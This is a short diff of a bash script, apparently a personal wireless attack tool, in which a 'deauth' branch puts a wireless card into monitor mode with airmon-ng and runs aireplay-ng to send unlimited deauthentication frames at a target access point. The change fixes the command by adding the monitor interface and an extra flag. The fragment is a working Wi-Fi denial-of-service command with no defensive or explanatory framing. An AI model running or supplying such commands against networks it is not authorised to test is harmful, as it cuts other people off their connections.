@@ -148,7 +148,7 @@ while [ exit != 2 ]; do
 	#Will be my favorite if it will work! gah!
 	deauth)Nearby_Mac
 		airmon-ng start wlan2
-		aireplay-ng -0 0 -a $TARGETAP
+		aireplay-ng -0 0 -a $TARGETAP mon0 --ignore-negative-one
 		wait
 		airmon-ng stop mon0
 	;;
